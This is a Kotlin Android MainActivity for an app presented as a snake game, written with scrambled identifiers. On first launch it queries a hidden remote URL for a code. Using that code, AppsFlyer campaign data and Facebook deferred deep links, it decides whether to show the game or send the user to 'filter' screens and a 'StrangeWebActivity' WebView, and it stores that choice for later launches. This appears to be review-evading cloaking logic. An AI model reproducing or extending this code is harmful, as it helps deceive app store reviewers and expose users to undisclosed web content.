package com.snake.io.slither.w

import android.content.Context
import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.snake.io.slither.w.MaaaainClas.Companion.AF_DEV_KEYdfrgt
import com.snake.io.slither.w.MaaaainClas.Companion.C1efgrth
import com.snake.io.slither.w.MaaaainClas.Companion.efrtgCH
import com.snake.io.slither.w.MaaaainClas.Companion.D1efrgt
import com.snake.io.slither.w.MaaaainClas.Companion.linkAppsCheckPart1frtgtgyhy
import com.snake.io.slither.w.MaaaainClas.Companion.linkAppsCheckPart2fgttyhy
import com.snake.io.slither.w.databinding.ActivityMainBinding
import com.snake.io.slither.w.gaaaaamy.GamyyyyyyActivity
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    var checkerfrgthby: String = "null"
    private lateinit var frgthybindMain: ActivityMainBinding
    lateinit var jsoupftghyhyFDRFR: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        frgthybindMain = ActivityMainBinding.inflate(layoutInflater)
        setContentView(frgthybindMain.root)
        jsoupftghyhyFDRFR = ""

        deePPfergtg(this)

        val prefsfgtgt = getSharedPreferences("ActivityPREF", MODE_PRIVATE)
        if (prefsfgtgt.getBoolean("activity_exec", false)) {

            val sharPrefdfgtt = getSharedPreferences("SP", MODE_PRIVATE)
            when (sharPrefdfgtt.getString(efrtgCH, "null")) {
                "2" -> {
                    skipMeeeeeee()
                }
                "3" -> {
                    dfrgttoUACFilter()

                }
                "4" -> {
                    testWVedfrgtg()
                }

                else -> {
                    toTestGroundsfgttg()
                }
            }

        } else {
            val execFRfrtgt = prefsfgtgt.edit()
            execFRfrtgt.putBoolean("activity_exec", true)
            execFRfrtgt.apply()

            val jobyyyyyyyyyyy = GlobalScope.launch(Dispatchers.IO) {
                checkerfrgthby = derfgtgtgtgetCheckCode(linkAppsCheckPart1frtgtgyhy + linkAppsCheckPart2fgttyhy)
            }
            runBlocking {
                try {
                    jobyyyyyyyyyyy.join()
                } catch (_: Exception) {
                }
            }

            when (checkerfrgthby) {
                "1" -> {
                    AppsFlyerLib.getInstance()
                        .init(AF_DEV_KEYdfrgt, frgttggttliiis, applicationContext)
                    AppsFlyerLib.getInstance().start(this)
                    frgythyh(1500)
                }
                "2" -> {
                    skipMeeeeeee()
                }
                "3" -> {
                    AppsFlyerLib.getInstance()
                        .init(AF_DEV_KEYdfrgt, frgttggttliiis, applicationContext)
                    AppsFlyerLib.getInstance().start(this)
                    afRecordUACedfergt(1500)
                }
                "0" -> {
                    toTestGroundsfgttg()
                }
                "4" -> {
                    testWVedfrgtg()
                }
            }
        }
    }


    private suspend fun derfgtgtgtgetCheckCode(link: String): String {
        val urlrfgth = URL(link)
        val oneStrrfrtgtttt = "1"
        val twoStrffrtgt = "2"
        val testStrfrgt = "3"
        val fourOnFourrrrrr = "4"
        val activeStrnnnnnnnn = "0"
        val urlConnectionnnnnnnnnn = withContext(Dispatchers.IO) {
            urlrfgth.openConnection()
        } as HttpURLConnection

        return try {
            when (val ttttttttttttext =
                urlConnectionnnnnnnnnn.inputStream.bufferedReader().readText()) {
                "2" -> {
                    val sharPreffffffffff1e3 =
                        applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
                    val editorfrgtgt = sharPreffffffffff1e3.edit()
                    editorfrgtgt.putString(efrtgCH, twoStrffrtgt)
                    editorfrgtgt.apply()
                    twoStrffrtgt
                }
                "1" -> {
                    oneStrrfrtgtttt
                }
                "3" -> {
                    val sharPrefdfrgttg =
                        applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
                    val editordfergtg = sharPrefdfrgttg.edit()
                    editordfergtg.putString(efrtgCH, testStrfrgt)
                    editordfergtg.apply()
                    testStrfrgt
                }
                "4" -> {
                    val efrgtsharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
                    val editorfrgt = efrgtsharPref.edit()
                    editorfrgt.putString(efrtgCH, fourOnFourrrrrr)
                    editorfrgt.apply()
                    fourOnFourrrrrr
                }
                else -> {
                    activeStrnnnnnnnn
                }
            }
        } finally {
            urlConnectionnnnnnnnnn.disconnect()
        }

    }

    private fun frgythyh(timeInterval: Long): Job {

        val sharPrefefrgft = getSharedPreferences("SP", MODE_PRIVATE)
        return CoroutineScope(Dispatchers.IO).launch {
            while (NonCancellable.isActive) {
                val dfrgthawk1: String? = sharPrefefrgft.getString(C1efgrth, null)
                if (dfrgthawk1 != null) {
                    toTestGroundsfgttg()
                    break
                } else {
                    val hawk1frgtgtt: String? = sharPrefefrgft.getString(C1efgrth, null)
                    delay(timeInterval)
                }
            }
        }
    }

    private fun afRecordUACedfergt(timeInterval: Long): Job {

        val sharPrefdfrgftgt = getSharedPreferences("SP", MODE_PRIVATE)
        return CoroutineScope(Dispatchers.IO).launch {
            while (NonCancellable.isActive) {
                val dfrgthawk1: String? = sharPrefdfrgftgt.getString(C1efgrth, null)
                if (dfrgthawk1 != null) {
                    dfrgttoUACFilter()
                    break
                } else {
                    val hawk1frgt: String? = sharPrefdfrgftgt.getString(C1efgrth, null)
                    delay(timeInterval)
                }
            }
        }
    }


    val frgttggttliiis = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val fergthysharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
            val editorrfrgty = fergthysharPref.edit()

            val dfrgthtten = data?.get("campaign").toString()
            editorrfrgty.putString(C1efgrth, dfrgthtten)
            editorrfrgty.apply()
        }

        override fun onConversionDataFail(p0: String?) {

        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }


    fun deePPfergtg(context: Context) {
        val sharPrefdfrgt = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
        val qqqqqqqqeditor = sharPrefdfrgt.edit()
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val dfergtgA = appLinkData.targetUri.host
                qqqqqqqqeditor.putString(D1efrgt, dfergtgA.toString())
                qqqqqqqqeditor.apply()
            }
            if (appLinkData == null) {

            }
        }
    }



    private fun dfrgttoUACFilter() {
        Intent(this, FilterMeOneActivity::class.java)
            .also { startActivity(it) }
        finish()
    }

    private fun skipMeeeeeee() {
        Intent(this, GamyyyyyyActivity::class.java)
            .also { startActivity(it) }
        finish()
    }
    private fun toTestGroundsfgttg() {
        Intent(this, FilterMeTvoActivity::class.java)
            .also { startActivity(it) }
        finish()
    }

    private fun testWVedfrgtg() {
        Intent(this, StrangeWebActivity::class.java)
            .also { startActivity(it) }
        finish()
    }




}